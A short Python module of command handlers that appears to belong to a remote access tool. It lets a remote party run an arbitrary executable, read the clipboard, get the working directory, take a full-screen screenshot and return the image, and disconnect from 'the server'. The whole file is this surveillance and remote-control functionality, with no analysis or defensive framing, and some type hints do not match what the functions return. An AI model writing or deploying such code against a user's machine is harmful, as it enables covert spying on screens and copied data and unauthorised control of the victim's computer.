from PIL import ImageGrab
from io import BytesIO
import subprocess
import pyperclip
import os


def execute(request_params: str) -> str:
    try:
        subprocess.run(request_params[0])
        response = f"{request_params[0]} is running."
    except FileNotFoundError:
        response = "[INVALID PATH] IN THIS FUNCTION YOU NEED TO GIVE ONE VALID PATH TO EXE FILE."
    return True, "string_handler", [response]


def copy_history(request_params: str) -> str:
    clipboard_contents = pyperclip.paste()
    return True, "string_handler", ["Last copy : " + clipboard_contents]


def current_location(request_params: str):
    current_dir = os.getcwd()
    return True, "string_handler", [current_dir]


def send_screenshot(request_params: str) -> str:
    screenshot = ImageGrab.grab()
    screenshot_bytes = BytesIO()
    screenshot.save(screenshot_bytes, format="PNG")
    screenshot_bytes = screenshot_bytes.getvalue()
    return True, "image_handler", screenshot_bytes


def disconnect(request_params: str) -> str:
    return False, "string_handler", ["YOU DISCONNECT FROM THE SERVER."]
